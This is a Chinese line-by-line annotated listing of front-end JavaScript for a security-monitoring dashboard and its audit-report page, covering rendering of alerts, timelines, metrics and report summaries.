| 304 | 页面更新：修改元素内容、样式或状态。 | `          trendNode.classList.toggle("metric-card__trend--up", delta > 0);` |
| 305 | 页面更新：修改元素内容、样式或状态。 | `          trendNode.classList.toggle("metric-card__trend--down", delta < 0);` |
| 306 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        }` |
| 307 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 308 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      _prevMetrics[key] = Number(next);` |
| 309 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 310 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 311 | 注释：说明前端逻辑或交互意图。 | `    // 安全评分变红的联动（<60 强制红色）` |
| 312 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const scoreNode = document.querySelector('[data-metric="security_score"]');` |
| 313 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (scoreNode) {` |
| 314 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const score = Number(stats.security_score);` |
| 315 | 页面更新：修改元素内容、样式或状态。 | `      scoreNode.classList.toggle("metric-card__value--danger", score < 60);` |
| 316 | 页面更新：修改元素内容、样式或状态。 | `      scoreNode.classList.toggle(` |
| 317 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "metric-card__value--emerald",` |
| 318 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        score >= 60` |
| 319 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      );` |
| 320 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 321 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 322 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 323 | 注释：说明前端逻辑或交互意图。 | `  /* ----------------------------- 告警列表 ----------------------------- */` |
| 324 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderAlertList(items) {` |
| 325 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const list = document.getElementById("alert-list");` |
| 326 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!list) return;` |
| 327 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!items \|\| items.length === 0) {` |
| 328 | 页面更新：修改元素内容、样式或状态。 | `      list.innerHTML = '<li class="alert-list__empty">暂无告警</li>';` |
| 329 | 返回结果：把计算值交给调用方。 | `      return;` |
| 330 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 331 | 页面更新：修改元素内容、样式或状态。 | `    list.innerHTML = items.map(renderAlertItem).join("");` |
| 332 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 333 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 334 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderAlertItem(alert) {` |
| 335 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const level = alert.level \|\| alert.threat_level \|\| "low";` |
| 336 | 返回结果：把计算值交给调用方。 | `    return (` |
| 337 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<li class="alert-item alert-item--' +` |
| 338 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      level +` |
| 339 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '">' +` |
| 340 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="alert-item__stripe" aria-hidden="true"></span>' +` |
| 341 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<div class="alert-item__content">' +` |
| 342 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<p class="alert-item__title">' +` |
| 343 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml(alert.details \|\| alert.message \|\| "未知事件") +` |
| 344 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</p>" +` |
| 345 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<div class="alert-item__meta">' +` |
| 346 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="alert-item__time">' +` |
| 347 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml(formatTime(alert.timestamp)) +` |
| 348 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>" +` |
| 349 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (alert.source_ip` |
| 350 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ? '<span class="alert-item__ip">' +` |
| 351 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          escapeHtml(alert.source_ip) +` |
| 352 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          "</span>"` |
| 353 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        : "") +` |
| 354 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (alert.threat_type` |
| 355 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ? '<span>' + escapeHtml(alert.threat_type) + "</span>"` |
| 356 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        : "") +` |
| 357 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</div>" +` |
| 358 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</div>" +` |
| 359 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<div class="alert-item__side">' +` |
| 360 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      levelBadge(level) +` |
| 361 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</div>" +` |
| 362 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</li>"` |
| 363 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 364 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 365 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 366 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function prependAlert(alert) {` |
| 367 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const list = document.getElementById("alert-list");` |
| 368 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!list) return;` |
| 369 | 注释：说明前端逻辑或交互意图。 | `    // 清空占位` |
| 370 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const empty = list.querySelector(".alert-list__empty");` |
| 371 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (empty) empty.remove();` |
| 372 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 373 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const tpl = document.createElement("template");` |
| 374 | 页面更新：修改元素内容、样式或状态。 | `    tpl.innerHTML = renderAlertItem(alert).trim();` |
| 375 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const node = tpl.content.firstChild;` |
| 376 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    list.prepend(node);` |
| 377 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 378 | 注释：说明前端逻辑或交互意图。 | `    // 只保留最近 20 条` |
| 379 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const items = list.querySelectorAll(".alert-item");` |
| 380 | 遍历处理：逐项渲染或转换数据。 | `    for (let i = 20; i < items.length; i++) {` |
| 381 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      items[i].remove();` |
| 382 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 383 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 384 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    prependTimeline(alert);` |
| 385 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 386 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 387 | 注释：说明前端逻辑或交互意图。 | `  /* ----------------------------- 时间线 ------------------------------- */` |
| 388 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderTimeline(items) {` |
| 389 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const node = document.getElementById("event-timeline");` |
| 390 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!node) return;` |
| 391 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!items \|\| items.length === 0) {` |
| 392 | 页面更新：修改元素内容、样式或状态。 | `      node.innerHTML = '<li class="alert-list__empty">暂无事件</li>';` |
| 393 | 返回结果：把计算值交给调用方。 | `      return;` |
| 394 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 395 | 页面更新：修改元素内容、样式或状态。 | `    node.innerHTML = items.map(renderTimelineItem).join("");` |
| 396 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 397 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 398 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderTimelineItem(alert) {` |
| 399 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const level = alert.level \|\| alert.threat_level \|\| "low";` |
| 400 | 返回结果：把计算值交给调用方。 | `    return (` |
| 401 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<li class="timeline__item">' +` |
| 402 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="timeline__time">' +` |
| 403 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml(formatTime(alert.timestamp)) +` |
| 404 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>" +` |
| 405 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      levelBadge(level) +` |
| 406 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "<span> " +` |
| 407 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml(alert.details \|\| alert.message \|\| "未知事件") +` |
| 408 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>" +` |
| 409 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</li>"` |
| 410 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 411 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 412 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 413 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function prependTimeline(alert) {` |
| 414 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const node = document.getElementById("event-timeline");` |
| 415 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!node) return;` |
| 416 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const empty = node.querySelector(".alert-list__empty");` |
| 417 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (empty) empty.remove();` |
| 418 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const tpl = document.createElement("template");` |
| 419 | 页面更新：修改元素内容、样式或状态。 | `    tpl.innerHTML = renderTimelineItem(alert).trim();` |
| 420 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    node.prepend(tpl.content.firstChild);` |
| 421 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const items = node.querySelectorAll(".timeline__item");` |
| 422 | 遍历处理：逐项渲染或转换数据。 | `    for (let i = 20; i < items.length; i++) items[i].remove();` |
| 423 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 424 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 425 | 注释：说明前端逻辑或交互意图。 | `  /* ----------------------------- WebSocket ---------------------------- */` |
| 426 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function connectWebSocket() {` |
| 427 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!window.io) return;` |
| 428 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 429 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const socket = window.io({` |
| 430 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      transports: ["websocket", "polling"],` |
| 431 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      reconnection: true,` |
| 432 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      reconnectionAttempts: Infinity,` |
| 433 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      reconnectionDelay: 2000,` |
| 434 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 435 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 436 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    socket.on("connect", () => {` |
| 437 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      console.info("[ws] connected");` |
| 438 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 439 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 440 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    socket.on("metrics_update", (payload) => {` |
| 441 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyMetrics(payload \|\| {});` |
| 442 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 443 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 444 | 注释：说明前端逻辑或交互意图。 | `    // 统一事件名（DESIGN §8.2 / Phase 7 Prompt 指定）` |
| 445 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    socket.on("alert", (alert) => handleIncomingAlert(alert));` |
| 446 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 447 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    socket.on("disconnect", () => console.info("[ws] disconnected"));` |
| 448 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 449 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 450 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function handleIncomingAlert(alert) {` |
| 451 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!alert \|\| typeof alert !== "object") return;` |
| 452 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    prependAlert(alert);` |
| 453 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    refreshAttackTypes();` |
| 454 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    refreshTopAttackers();` |
| 455 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 456 | 注释：说明前端逻辑或交互意图。 | `    // 高危与严重等级自动弹 toast，替代旧 threat_detected 事件的行为` |
| 457 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const level = alert.level \|\| alert.threat_level;` |
| 458 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (level === "high" \|\| level === "critical") {` |
| 459 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const title = alert.title \|\| alert.summary \|\| alert.details \|\| alert.threat_type \|\| "未分类威胁";` |
| 460 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast(` |
| 461 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "检测到" + (level === "critical" ? "严重" : "高危") + "威胁：" + title,` |
| 462 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        level === "critical" ? "error" : "warning"` |
| 463 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      );` |
| 464 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 465 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 466 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 467 | 注释：说明前端逻辑或交互意图。 | `  /* ----------------------------- 交互绑定 ----------------------------- */` |
| 468 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindRangeTabs() {` |
| 469 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    document.querySelectorAll("[data-range]").forEach((btn) => {` |
| 470 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      btn.addEventListener("click", () => {` |
| 471 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        currentRange = btn.dataset.range;` |
| 472 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        document` |
| 473 | DOM 查询：定位页面元素以便读取或更新。 | `          .querySelectorAll("[data-range]")` |
| 474 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `          .forEach((b) => b.classList.remove("is-active"));` |
| 475 | 页面更新：修改元素内容、样式或状态。 | `        btn.classList.add("is-active");` |
| 476 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        refreshTraffic();` |
| 477 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 478 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 479 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 480 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 481 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindRefresh() {` |
| 482 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const btn = document.getElementById("btn-refresh");` |
| 483 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!btn) return;` |
| 484 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    btn.addEventListener("click", () => {` |
| 485 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      btn.disabled = true;` |
| 486 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      loadInitial().finally(() => {` |
| 487 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        btn.disabled = false;` |
| 488 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 489 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 490 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 491 | 前端语句：驱动页面交互、状态管理或数据展示。 | `})();` |

## `web/static/js/reports.js`

- 类型：前端静态资源
- 行数：495

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 注释：说明前端逻辑或交互意图。 | `/*` |
| 2 | 注释：说明前端逻辑或交互意图。 | ` * reports.js — 审计报告控制器（Phase 7，DESIGN.md §8.6）` |
| 3 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 4 | 注释：说明前端逻辑或交互意图。 | ` * 职责：` |
| 5 | 注释：说明前端逻辑或交互意图。 | ` *   1. 拉取 /api/reports/summary，按 period 刷新` |
| 6 | 注释：说明前端逻辑或交互意图。 | ` *   2. 填充封面 / 概览 / 威胁统计 / 响应记录 / 模型性能 / 建议` |
| 7 | 注释：说明前端逻辑或交互意图。 | ` *   3. 浅色 ECharts（威胁等级饼 / 攻击类型条 / 时间线 / 置信度分布）` |
| 8 | 注释：说明前端逻辑或交互意图。 | ` *   4. 导出：` |
| 9 | 注释：说明前端逻辑或交互意图。 | ` *      - JSON  → 直接下载 summary 原始 JSON` |
| 10 | 注释：说明前端逻辑或交互意图。 | ` *      - HTML  → 下载当前页面的自包含快照` |
| 11 | 注释：说明前端逻辑或交互意图。 | ` *      - PDF   → 调 window.print()，由用户选择打印为 PDF` |
| 12 | 注释：说明前端逻辑或交互意图。 | ` */` |
| 13 | 前端语句：驱动页面交互、状态管理或数据展示。 | `(function () {` |
| 14 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  "use strict";` |
| 15 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 16 | 条件判断：根据页面状态或数据决定执行路径。 | `  if (!window.AGApi) return;` |
| 17 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { fetchApi } = window.AGApi;` |
| 18 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { escapeHtml, formatTime, toast } = window.AGUI;` |
| 19 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 20 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const PERIOD_LABELS = { day: "日报", week: "周报", month: "月报" };` |
| 21 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const PERIOD_WINDOW_LABEL = {` |
| 22 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    day: "近 24 小时",` |
| 23 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    week: "近 7 天",` |
| 24 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    month: "近 30 天",` |
| 25 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 26 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const LEVEL_COLOR = {` |
| 27 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    low: "#3B82F6",` |
| 28 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    medium: "#F59E0B",` |
| 29 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    high: "#EF4444",` |
| 30 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    critical: "#EC4899",` |
| 31 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 32 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const STATUS_LABEL = {` |
| 33 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    open: "未处理",` |
| 34 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    acknowledged: "已确认",` |
| 35 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    resolved: "已处理",` |
| 36 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    ignored: "已忽略",` |
| 37 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 38 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const ACTION_LABEL = {` |
| 39 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    ban_ip: "封禁 IP",` |
| 40 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    mark_acknowledged: "标记已确认",` |
| 41 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    mark_resolved: "标记已处理",` |
| 42 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    mark_ignored: "标记已忽略",` |
| 43 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 44 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 45 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 46 | 注释：说明前端逻辑或交互意图。 | `   * 状态 & DOM` |
| 47 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 48 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const state = {` |
| 49 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    period: "day",` |
| 50 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    summary: null,` |
| 51 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    charts: {},` |
| 52 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 53 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 54 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const el = {` |
| 55 | DOM 查询：定位页面元素以便读取或更新。 | `    btnPeriods: document.querySelectorAll("[data-period]"),` |
| 56 | DOM 查询：定位页面元素以便读取或更新。 | `    btnRefresh: document.getElementById("btn-refresh"),` |
| 57 | DOM 查询：定位页面元素以便读取或更新。 | `    btnExportJson: document.getElementById("btn-export-json"),` |
| 58 | DOM 查询：定位页面元素以便读取或更新。 | `    btnExportHtml: document.getElementById("btn-export-html"),` |
| 59 | DOM 查询：定位页面元素以便读取或更新。 | `    btnExportPdf: document.getElementById("btn-export-pdf"),` |
| 60 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 61 | DOM 查询：定位页面元素以便读取或更新。 | `    coverTitle: document.getElementById("cover-title"),` |
| 62 | DOM 查询：定位页面元素以便读取或更新。 | `    coverSubtitle: document.getElementById("cover-subtitle"),` |
| 63 | DOM 查询：定位页面元素以便读取或更新。 | `    coverGenerated: document.getElementById("cover-generated"),` |
| 64 | DOM 查询：定位页面元素以便读取或更新。 | `    coverWindow: document.getElementById("cover-window"),` |
| 65 | DOM 查询：定位页面元素以便读取或更新。 | `    coverModel: document.getElementById("cover-model"),` |
| 66 | DOM 查询：定位页面元素以便读取或更新。 | `    coverScore: document.getElementById("cover-score"),` |
| 67 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 68 | DOM 查询：定位页面元素以便读取或更新。 | `    overviewGrid: document.getElementById("overview-grid"),` |
| 69 | DOM 查询：定位页面元素以便读取或更新。 | `    chartLevel: document.getElementById("chart-level"),` |
| 70 | DOM 查询：定位页面元素以便读取或更新。 | `    chartType: document.getElementById("chart-type"),` |
| 71 | DOM 查询：定位页面元素以便读取或更新。 | `    chartTimeline: document.getElementById("chart-timeline"),` |
| 72 | DOM 查询：定位页面元素以便读取或更新。 | `    chartConfidence: document.getElementById("chart-confidence"),` |
| 73 | DOM 查询：定位页面元素以便读取或更新。 | `    tableTopSources: document.querySelector("#table-top-sources tbody"),` |
| 74 | DOM 查询：定位页面元素以便读取或更新。 | `    tableResponses: document.querySelector("#table-responses tbody"),` |
| 75 | DOM 查询：定位页面元素以便读取或更新。 | `    recommendations: document.getElementById("recommendations-list"),` |
| 76 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 77 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 78 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 79 | 注释：说明前端逻辑或交互意图。 | `   * 工具` |
| 80 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 81 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function fmtInt(v) {` |
| 82 | 返回结果：把计算值交给调用方。 | `    return v === null \|\| v === undefined \|\| v === "" ? "—" : v.toLocaleString();` |
| 83 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 84 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 85 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function fmtPercent(v) {` |
| 86 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (typeof v !== "number") return "—";` |
| 87 | 返回结果：把计算值交给调用方。 | `    return (v * 100).toFixed(1) + "%";` |
| 88 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 89 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 90 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function fmtDuration(sec) {` |
| 91 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!sec \|\| sec <= 0) return "—";` |
| 92 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (sec < 60) return \`${sec} 秒\`;` |
| 93 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (sec < 3600) return \`${Math.round(sec / 60)} 分\`;` |
| 94 | 返回结果：把计算值交给调用方。 | `    return \`${(sec / 3600).toFixed(1)} 小时\`;` |
| 95 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 96 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 97 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function setText(node, value) {` |
| 98 | 页面更新：修改元素内容、样式或状态。 | `    if (node) node.textContent = value === null \|\| value === undefined ? "—" : String(value);` |
| 99 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 100 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 101 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 102 | 注释：说明前端逻辑或交互意图。 | `   * 数据加载` |
| 103 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 104 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function loadSummary() {` |
| 105 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 106 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const summary = await fetchApi("/api/reports/summary", {` |
| 107 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        query: { period: state.period },` |
| 108 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 109 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.summary = summary;` |
| 110 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      render(summary);` |
| 111 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 112 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("生成报告失败：" + (err.message \|\| ""), "error");` |
| 113 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 114 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 115 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 116 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 117 | 注释：说明前端逻辑或交互意图。 | `   * 渲染` |
| 118 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 119 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function render(s) {` |
| 120 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderCover(s);` |
| 121 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderOverview(s.overview \|\| {});` |
| 122 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderThreats(s.threats \|\| {});` |
| 123 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderResponses(s.responses \|\| []);` |
| 124 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderModelPerf(s.model_performance \|\| {});` |
| 125 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderRecommendations(s.recommendations \|\| []);` |
| 126 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 127 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 128 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderCover(s) {` |
| 129 | 页面更新：修改元素内容、样式或状态。 | `    el.coverTitle.textContent =` |
| 130 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "AI 安全守卫 · 安全审计" + (PERIOD_LABELS[s.period] \|\| "报告");` |
| 131 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setText(el.coverGenerated, formatTime(s.generated_at));` |
| 132 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    setText(` |
| 133 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.coverWindow,` |
| 134 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      s.window ? \`${formatTime(s.window.start)} → ${formatTime(s.window.end)}\` : "—"` |
| 135 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
